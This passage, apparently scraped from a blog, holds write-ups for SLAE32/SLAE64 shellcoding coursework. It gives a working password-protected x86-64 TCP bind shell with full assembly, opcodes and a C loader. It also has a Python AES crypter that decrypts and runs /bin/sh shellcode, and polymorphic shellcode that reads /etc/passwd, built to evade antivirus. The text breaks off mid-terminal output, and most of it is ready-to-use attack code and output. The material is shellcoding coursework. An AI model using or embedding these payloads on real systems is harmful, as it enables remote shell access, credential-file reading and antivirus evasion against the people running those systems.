0x6c6e6d656c6f7369 ; lnmelosi push rsi mov rsi, rsp ; password buffer pointer xor rcx, rcx add rcx, 32 ; 31 bytes for password and 1 byte for newline char repe cmpsb jne password ; ###### ------------------------------------------ ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscall We can verify the shellcode does not have null bytes as shown below with objdump\nobjdump -M intel -d shell-bind-password shell-bind-password: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u0026lt;_start\u0026gt;: 401000:\teb 15 jmp 401017 \u0026lt;main\u0026gt; 0000000000401002 \u0026lt;ask_pass\u0026gt;: 401002:\t54 push rsp 401003:\t65 6c gs ins BYTE PTR es:[rdi],dx 401005:\t6c ins BYTE PTR es:[rdi],dx 401006:\t20 6d 65 and BYTE PTR [rbp+0x65],ch 401009:\t20 74 68 65 and BYTE PTR [rax+rbp*2+0x65],dh 40100d:\t20 70 61 and BYTE PTR [rax+0x61],dh 401010:\t73 73 jae 401085 \u0026lt;password+0x9\u0026gt; 401012:\t63 6f 64 movsxd ebp,DWORD PTR [rdi+0x64] 401015:\t65 gs 401016:\t0a .byte 0xa 0000000000401017 \u0026lt;main\u0026gt;: 401017:\t48 31 f6 xor rsi,rsi 40101a:\t48 f7 e6 mul rsi 40101d:\t48 83 c0 29 add rax,0x29 401021:\t6a 02 push 0x2 401023:\t5f pop rdi 401024:\t48 ff c6 inc rsi 401027:\t0f 05 syscall 401029:\t48 97 xchg rdi,rax 40102b:\t48 31 c0 xor rax,rax 40102e:\t50 push rax 40102f:\t66 68 23 29 pushw 0x2923 401033:\t66 6a 02 pushw 0x2 401036:\t48 89 e6 mov rsi,rsp 401039:\t48 83 c2 10 add rdx,0x10 40103d:\t48 83 c0 31 add rax,0x31 401041:\t0f 05 syscall 401043:\t48 31 c0 xor rax,rax 401046:\t48 89 c2 mov rdx,rax 401049:\t48 83 c2 01 add rdx,0x1 40104d:\t48 83 c0 32 add rax,0x32 401051:\t0f 05 syscall 401053:\t48 31 c0 xor rax,rax 401056:\t48 89 c6 mov rsi,rax 401059:\t48 89 c2 mov rdx,rax 40105c:\t48 83 c0 2b add rax,0x2b 401060:\t0f 05 syscall 401062:\t48 97 xchg rdi,rax 401064:\t4d 31 c9 xor r9,r9 0000000000401067 \u0026lt;loopin\u0026gt;: 401067:\t48 31 c0 xor rax,rax 40106a:\t48 83 c0 21 add rax,0x21 40106e:\t4c 89 ce mov rsi,r9 401071:\t0f 05 syscall 401073:\t49 ff c1 inc r9 401076:\t49 83 f9 03 cmp r9,0x3 40107a:\t75 eb jne 401067 \u0026lt;loopin\u0026gt; 000000000040107c \u0026lt;password\u0026gt;: 40107c:\t48 31 c0 xor rax,rax 40107f:\t48 31 d2 xor rdx,rdx 401082:\t48 ff c0 inc rax 401085:\t48 89 c7 mov rdi,rax 401088:\t48 8d 35 73 ff ff ff lea rsi,[rip+0xffffffffffffff73] # 401002 \u0026lt;ask_pass\u0026gt; 40108f:\tb2 15 mov dl,0x15 401091:\t0f 05 syscall 401093:\t48 31 d2 xor rdx,rdx 401096:\t48 31 c0 xor rax,rax 401099:\t48 31 ff xor rdi,rdi 40109c:\t48 89 e6 mov rsi,rsp 40109f:\t48 83 c2 20 add rdx,0x20 4010a3:\t0f 05 syscall 4010a5:\t48 89 e7 mov rdi,rsp 4010a8:\t48 31 f6 xor rsi,rsi 4010ab:\t56 push rsi 4010ac:\t48 be 6f 6e 6f 67 6f movabs rsi,0xa646f6f676f6e6f 4010b3:\t6f 64 0a 4010b6:\t56 push rsi 4010b7:\t48 be 61 74 69 61 6d movabs rsi,0x7470756d61697461 4010be:\t75 70 74 4010c1:\t56 push rsi 4010c2:\t48 be 79 73 77 65 61 movabs rsi,0x6874726165777379 4010c9:\t72 74 68 4010cc:\t56 push rsi 4010cd:\t48 be 69 73 6f 6c 65 movabs rsi,0x6c6e6d656c6f7369 4010d4:\t6d 6e 6c 4010d7:\t56 push rsi 4010d8:\t48 89 e6 mov rsi,rsp 4010db:\t48 31 c9 xor rcx,rcx 4010de:\t80 c1 20 add cl,0x20 4010e1:\tf3 a6 repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 4010e3:\t75 97 jne 40107c \u0026lt;password\u0026gt; 4010e5:\t48 31 c0 xor rax,rax 4010e8:\t50 push rax 4010e9:\t48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 4010f0:\t2f 73 68 4010f3:\t53 push rbx 4010f4:\t48 89 e7 mov rdi,rsp 4010f7:\t50 push rax 4010f8:\t48 89 e2 mov rdx,rsp 4010fb:\t57 push rdi 4010fc:\t48 89 e6 mov rsi,rsp 4010ff:\t48 83 c0 3b add rax,0x3b 401103:\t0f 05 syscall From the output we can verify the null bytes were gone effectively.\nCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes I\u0026rsquo;ll use the 64-bit version of assembler.sh.\nAvailable in https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ ../../assembler.sh shell-bind-password.nasm 130 ↵ [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 262 \u0026#34;\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x48\\x83\\xc0\\x31\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc2\\x01\\x48\\x83\\xc0\\x32\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc6\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2b\\x0f\\x05\\x48\\x97\\x4d\\x31\\xc9\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x4c\\x89\\xce\\x0f\\x05\\x49\\xff\\xc1\\x49\\x83\\xf9\\x03\\x75\\xeb\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x73\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x48\\x83\\xc1\\x20\\xf3\\xa6\\x75\\x96\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x48\\x83\\xc0\\x31\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc2\\x01\\x48\\x83\\xc0\\x32\\x0f\\x05\\x48\\x31\\xc0\\x48\\x89\\xc6\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2b\\x0f\\x05\\x48\\x97\\x4d\\x31\\xc9\\x48\\x31\\xc0\\x48\\x83\\xc0\\x21\\x4c\\x89\\xce\\x0f\\x05\\x49\\xff\\xc1\\x49\\x83\\xf9\\x03\\x75\\xeb\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x73\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x80\\xc1\\x20\\xf3\\xa6\\x75\\x97\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ ./shellcode Shellcode Length: 262 --------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -nv 127.0.0.1 9001 (UNKNOWN) [127.0.0.1] 9001 (?) open Tell me the passcode dasdhja Tell me the passcode isolemnlyswearthatiamuptonogood whoami edu id uid=1000(edu) gid=1000(edu) groups=1000(edu) ... Oh yeah! The shellcode checks correctly for the right password and spawns a shell!\nThis blog post has been created for completing the requirements of the x86_64 Assembly Language and Shellcoding on Linux (SLAE64): https://www.pentesteracademy.com/course?id=7\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n","permalink":"https://0xnibbles.github.io/posts/slae64/slae_64_assignment_1/","summary":"This post introduces the first mission of my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Teh user needs to provide a correct password Executing a shell on incoming connection if thepassword is valid; The shellcode should be null-free; Past, present and Future The exercises of SLAE64 are identical to the ones of SLAE32, so for the 64-bit version, I will have a more simple approach.","title":"SLAE64 Assignment 1 - TCP Bind Shellcode"},{"content":" This post introduces the 7th and last mission of my SLAE32 journey.\nA different task as I decided to work with python3, and most of the work dealt with conversion types between encrypting and decrypting the shellcode.\nIntroduction The SLAE32 7th assignment\u0026rsquo;s purpose is to create a custom crypter that references the one shown in the crypter lesson.\nFor this task, there are no special requirements:\nCan use any existing encryption schema Can use any programming language I decided to have a more straightforward approach to this task without going into as much detail as in previous assignments. They were hard, and I felt like having cryptography in the assembly world, I should make things more complex than needed.\nCrypter For the encryption scheme, the choice was AES in CTR mode. I used the script made for the custom encoder/decoder assignment as a reference.\nFor the shellcode I used the execve stack shellcode\n\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80 Let\u0026rsquo;s see the crypter script.\n#!/usr/bin/python3 # AES CTR-mode shellcode crypter import argparse import secrets import sys import string import pyaes import binascii import os secretsGenerator = secrets.SystemRandom() c_style_shellcode = (b\u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;) # bin/sh shellcode = \u0026#34;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34; encrypted_shellcode = \u0026#34;\\xee\\x61\\x71\\x58\\x31\\xe4\\xa0\\x9b\\x61\\x40\\xef\\x89\\x34\\xa2\\xd7\\x0d\\x9f\\x76\\x71\\x5a\\x97\\x77\\xe4\\x7f\\xe0\u0026#34; # encrypted shellcode iv =86225370279291231266238124133917033753321926857843067389263155507994576978348 def banner(): print(\u0026#39;\u0026#39;\u0026#39; ________________________________________________________ \u0026lt;The \u0026#34;AEShellCrypter\u0026#34; - Encrypt your shellcode with AES \u0026gt; -------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\\\ ||----w | || || \u0026#39;\u0026#39;\u0026#39;) #---------------------------- class Crypter: def randomKeyGenerator(self): alphabet = string.ascii_letters + string.digits + string.punctuation key = \u0026#39;\u0026#39;.join(secrets.choice(alphabet) for i in range(16)) return str.encode(key) def __init__(self,key=None): if key is not None: self.key = str.encode(key) print(\u0026#34;[*] Key Provided. Doing magic with it\u0026#34;) else: self.key = self.randomKeyGenerator() print(\u0026#34;[*] Doing magic with a (pseudo) Random key\u0026#34;) print(\u0026#34;[*] Key: \u0026#34;+self.key.decode()) def encrypt(self, shellcode): #iv = secrets.randbits(256) # for random IV aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv)) crypted_shellcode = aes.encrypt(shellcode) print(\u0026#34;IV: \u0026#34;+str(iv)) #print(\u0026#39;Encrypted:\u0026#39;, crypted_shellcode) final_shellcode = \u0026#34;\u0026#34; for crypted_shellbyte in bytearray(crypted_shellcode): final_shellcode += \u0026#39;\\\\x\u0026#39; + \u0026#39;%02x\u0026#39; % crypted_shellbyte # \\x format # print encrypted shellcode in c-style format print() print(final_shellcode) def decrypt(self, final_shellcode): print(\u0026#34;Decrypted\u0026#34;) final_shellcode = bytes(final_shellcode, encoding=\u0026#34;raw_unicode_escape\u0026#34;) aes = pyaes.AESModeOfOperationCTR(self.key, pyaes.Counter(iv)) decrypted_shellcode = aes.decrypt(final_shellcode) original_shellcode = \u0026#34;\u0026#34; for shellbyte in bytearray(decrypted_shellcode): original_shellcode += \u0026#39;\\\\x\u0026#39; + \u0026#39;%02x\u0026#39; % shellbyte # \\x format return original_shellcode #print(binascii.hexlify(bytearray(final_shellcode.replace(\u0026#34;\\\\x\u0026#34;,\u0026#34;\u0026#34;).encode()))) def executeShellcode(original_shellcode): file = open(\u0026#34;shellcode.c\u0026#34;, \u0026#34;w\u0026#34;) file.write(\u0026#39;\u0026#39;\u0026#39; #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\\u0026#34;\u0026#39;\u0026#39;\u0026#39; + original_shellcode + \u0026#39;\u0026#39;\u0026#39;\u0026#34;; void main() { printf(\\\u0026#34;Shellcode Length: %d\\\\n\\\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); }\u0026#39;\u0026#39;\u0026#39; ) file.close() os.system(\u0026#34;gcc -fno-stack-protector -z execstack -m32 shellcode.c -o shellcode 2\u0026gt;/dev/null\u0026#34;) os.system(\u0026#34;./shellcode\u0026#34;) def main(): #shellcode = bytearray(c_style_shellcode) #print(\u0026#34;[*] Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) #print(\u0026#34;[*] Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Encrypted Shellcode length: \u0026#34;+str(len(shellcode))+\u0026#34;\\n\u0026#34;) print(\u0026#34;[*] Encrypted Shellcode: \u0026#34;+str(c_style_shellcode)+\u0026#34;\\n\u0026#34;) # dynamic c-style use bytes(final_shellcode, encoding=\u0026#34;raw_unicode_escape\u0026#34;) # -------------------KEY-------------- key = \u0026#34;B6*D+/5DQ$MFn\u0026lt;T{\u0026#34; # example key #key = None ##################################### crypter = Crypter(key); crypter.encrypt(shellcode) original_shellcode = crypter.decrypt(encrypted_shellcode) executeShellcode(original_shellcode) if __name__ == \u0026#39;__main__\u0026#39;: banner() # displays the program banner main() print(\u0026#34;\\n--------------------\u0026#34;) print(\u0026#34;[*] Hack the World!\u0026#34;) print(\u0026#34;--------------------\u0026#34;) print() print() For AES CTR mode, we need to pay attention to the iv and key of the encryption process because they are a must for the decryption process.\nBasically, this encryption does the following:\naccepts shellcode in \\x format - shellcode variable; generates a pseudorandom key and iv or uses one provided by the user - key and iv variables; prints the shellcode in \\x format All this process is manual by the time of writing this post. The shellcode, iv, and encrypted shellcode are hardcoded.\nFor the decryption process:\nJust prepared the encrypted shellcode (encrypted_shellcode variable) for decryption as it receives a bytes object; Use the encryption iv and key to decrypt the shellcode; Then, appends the decrypted shellcode to a shellcode.c program, compiles it with gcc, and executes it.\nExecuting the python Crypter:\n╭─edu@debian ~/Desktop/slae_x86/assignments/7-Custom_Crypter ‹main●› ╰─$ python3 aesCrypter.py ________________________________________________________ \u0026lt;The \u0026#34;AEShellCrypter\u0026#34; - Encrypt your shellcode with AES \u0026gt; -------------------------------------------------------- \\ ^__^ \\ (oo)\\_______ (__)\\ )\\/\\ ||----w | || || [*] Encrypted Shellcode length: 25 [*] Encrypted Shellcode: b\u0026#39;1\\xc0Ph//shh/bin\\x89\\xe3P\\x89\\xe2S\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#39; [*] Key Provided. Doing magic with it [*] Key: B6*D+/5DQ$MFn\u0026lt;T{ IV: 86225370279291231266238124133917033753321926857843067389263155507994576978348 \\xee\\x61\\x71\\x58\\x31\\xe4\\xa0\\x9b\\x61\\x40\\xef\\x89\\x34\\xa2\\xd7\\x0d\\x9f\\x76\\x71\\x5a\\x97\\x77\\xe4\\x7f\\xe0 Decrypted Shellcode Length: 25 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ -------------------- [*] Hack the World! -------------------- We get a shell!!!\nImproving this script is a future work to be performed. Working with different types in Python is a time-consuming task and requires some ability to handle it.\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_7/","summary":"This post introduces the 7th and last mission of my SLAE32 journey.\nA different task as I decided to work with python3, and most of the work dealt with conversion types between encrypting and decrypting the shellcode.\nIntroduction The SLAE32 7th assignment\u0026rsquo;s purpose is to create a custom crypter that references the one shown in the crypter lesson.\nFor this task, there are no special requirements:\nCan use any existing encryption schema Can use any programming language I decided to have a more straightforward approach to this task without going into as much detail as in previous assignments.","title":"SLAE32 Assignment 7 - Custom Crypter"},{"content":" This post introduces the 6th mission of my SLAE32 journey.\nIf the previous assignment was incredible, this one was even cooler because I could apply what I learned in the Msfvenom analysis assignment to develop polymorphic versions of existing shellcodes.\nSome existing tools, such as ADMutate, will XOR-encrypt the existing shellcode and attach the loader code to it. This is useful, but writing polymorphic shellcodes without a tool is a much better learning experience.\nIntroduction The SLAE32 6th assignment task is to select three shellcode payloads from the shell-storm and create polymorphic versions of them without increasing the size of the shellcode by more than 50%;\nBonus points if we can make it shorter in length compared to the original.\nShellcode 1 - sys_exit(0) This shellcode was written by gunslinger_, and is located here. This shellcode only calls exit() with 0 as exit code.\nSize: 8 bytes\n/* Name : 8 bytes sys_exit(0) x86 linux shellcode Date : may, 31 2010 Author : gunslinger_ Web : devilzc0de.com blog : gunslinger.devilzc0de.com tested on : linux debian */ char *bye= \u0026#34;\\x31\\xc0\u0026#34; /* xor %eax,%eax */ \u0026#34;\\xb0\\x01\u0026#34; /* mov $0x1,%al */ \u0026#34;\\x31\\xdb\u0026#34; /* xor %ebx,%ebx */ \u0026#34;\\xcd\\x80\u0026#34;; /* int $0x80 */ int main(void) { ((void (*)(void)) bye)(); return 0; } This is a short code. We have minimum alternatives to work with.\nglobal _start section .text _start: xor ebx, ebx ; clear ebx mul ebx ; using mul to clear eax and edx inc eax ; put exit(1) syscall in eax syscall Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ ../../../../assembler.sh 7-byte-poly_sys_exit.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 7 \u0026#34;\\x31\\xdb\\xf7\\xe3\\x40\\x0f\\x05\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xdb\\xf7\\xe3\\x40\\x0f\\x05\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ ./shellcode Shellcode Length: 7 ╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/sys_exit(0)-shellcode-623/poly ‹main●› ╰─$ echo $? 0 Size: 7 bytes\nReduced 1 byte which is less 12,5% in size compared to the original.\nShellcode 2 - cat passwd Shellcode This shellcode was written by fb1h2s, and is located here. This shellcode will read the /etc/passwd file.\nSize: 43 bytes\n#include \u0026lt;stdio.h\u0026gt; const char shellcode[]=\u0026#34;\\x31\\xc0\u0026#34; // xorl %eax,%eax \u0026#34;\\x99\u0026#34; // cdq \u0026#34;\\x52\u0026#34; // push edx \u0026#34;\\x68\\x2f\\x63\\x61\\x74\u0026#34; // push dword 0x7461632f \u0026#34;\\x68\\x2f\\x62\\x69\\x6e\u0026#34; // push dword 0x6e69622f \u0026#34;\\x89\\xe3\u0026#34; // mov ebx,esp \u0026#34;\\x52\u0026#34; // push edx \u0026#34;\\x68\\x73\\x73\\x77\\x64\u0026#34; // pu sh dword 0x64777373 \u0026#34;\\x68\\x2f\\x2f\\x70\\x61\u0026#34; // push dword 0x61702f2f \u0026#34;\\x68\\x2f\\x65\\x74\\x63\u0026#34; // push dword 0x6374652f \u0026#34;\\x89\\xe1\u0026#34; // mov ecx,esp \u0026#34;\\xb0\\x0b\u0026#34; // mov $0xb,%al \u0026#34;\\x52\u0026#34; // push edx \u0026#34;\\x51\u0026#34; // push ecx \u0026#34;\\x53\u0026#34; // push ebx \u0026#34;\\x89\\xe1\u0026#34; // mov ecx,esp \u0026#34;\\xcd\\x80\u0026#34; ; // int 80h int main() { (*(void (*)()) shellcode)(); return 0; } /* shellcode[]=\t\u0026#34;\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\u0026#34; \u0026#34;\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\u0026#34;; */ We will use the assembly comments to know what the code is doing. It appears to use some tricks we have already used in past assignments, so we’ll add junk instructions to change them a bit in the code.\nglobal _start section .text _start: mov eax, -1\t; put 0xfffff in eax inc eax\t; eax becomes zero cdq\t; zeroes edx lea ebx, [esp-0xc]\t; push edx push dword 0x7461632f ; tac/ push dword 0x6e69622f ; nib/ lea ecx, [ebx-0x10] ; use ebx as our \u0026#34;stack pointer\u0026#34; push edx push dword 0x64777374 ; dwst - changes a \u0026#39;s\u0026#39; for a \u0026#39;t\u0026#39; push dword 0x61702f2f ; ap// push dword 0x6374652f ; cte/ mov ax, 0x4a2f ; using AND operation because results in printable ASCII characters push edx xor byte [esp+0xc], 0x7\t; replacing \u0026#39;t\u0026#39; for a \u0026#39;s\u0026#39; push ecx push ebx mov ecx, esp and ax,0x358b ; becomeoxb - using AND operations to resulting in nulling part of eax without null bytes int 0x80 From the beginning of the code, eax and edx, become zero. For some instructions below, we changed one letter from /etc/passwd to /etc/patswd, which we replaced later the t with an s.\nThe coolest trick here is the use of AND operations to zero eax. A really cool challenge because it is an alternative to XOR operations. AND logic operations assemble into printable ASCII characters range (from 0x33 to 0x7e). XOR logic operations don\u0026rsquo;t assemble into the printable ASCII range.\nSome buffers don\u0026rsquo;t allow unprintable characters. This way we can exploit what was previously unexploitable.\nLet’s use an example to show how it works.\nASCII Printable Polymorphic Shellcode The AND logic table transforms bits as follows:\n1 and 1 = 1 0 and 0 = 0 1 and 0 = 0 0 and 1 = 0 Because the only case where the result is a 1 is when both bits are 1, if two inverse values are ANDed onto EAX, EAX will become zero.\nBinary Hexadecimal 1000101010011100100111101001010 0x454e4f4a AND 0111010001100010011000000110101 AND 0x3a313035 ------------------------------------ --------------- 0000000000000000000000000000000 0x00000000 Using this technique the two printable 32-bit values are also bitwise inverses of each other.\nWhat\u0026rsquo;s the advantage?\neax can be zeroed without using null bytes, and the outcome is assembled machine code will be printable text.\nFrom https://www.dmi.unipg.it/~bista/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html\nGetting back to our exercise, let’s use our code to demonstrate how we leverage this technique for our purpose.\nThe instructions used with this technique are as follows:\nmov ax, 0x4a2f and ax, 0x358b The main goal is eax value become 0xb (execve syscall). So let’s see below why we used these values to perform the AND operation and the result of it.\nBinary Hexadecimal 0100 1010 0010 1111 0x4a2f AND 0011 0101 1000 1011 AND 0x358b ----------------------- ------------- 0000 0000 0000 1011 0x000b These two values are the inverse of each in the higher 8 bits, but in the low 8 bits, they result in 0xb, the execve syscall.\nWill an antivirus or a human able to spot this by only looking at it?\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ ../../../assembler.sh cat_passwd.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 61 \u0026#34;\\xb8\\xff\\xff\\xff\\xff\\x40\\x99\\x8d\\x5c\\x24\\xf4\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x4b\\xf0\\x52\\x68\\x74\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x66\\xb8\\x2f\\x4a\\x52\\x80\\x74\\x24\\x0c\\x07\\x51\\x53\\x89\\xe1\\x66\\x25\\x8b\\x35\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xb8\\xff\\xff\\xff\\xff\\x40\\x99\\x8d\\x5c\\x24\\xf4\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x8d\\x4b\\xf0\\x52\\x68\\x74\\x73\\x77\\x64\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x66\\xb8\\x2f\\x4a\\x52\\x80\\x74\\x24\\x0c\\x07\\x51\\x53\\x89\\xe1\\x66\\x25\\x8b\\x35\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/6-Polymorphic-Shellcode/cat_passwd-shellcode-571 ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian 